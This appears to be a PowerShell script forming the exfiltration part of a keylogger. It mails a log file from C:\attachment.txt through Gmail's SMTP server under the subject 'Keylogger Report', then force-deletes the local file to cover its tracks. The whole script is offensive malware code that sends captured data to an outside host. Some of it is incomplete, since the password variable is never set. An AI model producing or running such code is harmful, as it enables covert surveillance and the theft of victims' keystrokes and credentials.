param(
    [string]$Username = "",  # Keep only username (without @gmail.com)
    [string]$attachmentpath = "C:\attachment.txt",
    [string]$email = "@gmail.com"
)

function Send-ToEmail {
    param([string]$email, [string]$attachmentpath)

    $message = New-Object Net.Mail.MailMessage
    $message.From = "$Username@gmail.com"  # Dynamic from address
    $message.To.Add($email)
    $message.Subject = "Keylogger Report"
    $message.Body = "Logs attached"

    try {
        $attachment = New-Object Net.Mail.Attachment($attachmentpath)
        $message.Attachments.Add($attachment)

        $smtp = New-Object Net.Mail.SmtpClient("smtp.gmail.com", 587)
        $smtp.EnableSSL = $true
        $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
        $smtp.Send($message)
    }
    finally {
        $attachment.Dispose()
        if (Test-Path $attachmentpath) {
            Remove-Item $attachmentpath -Force
        }
    }
}

Send-ToEmail -email $email -attachmentpath $attachmentpath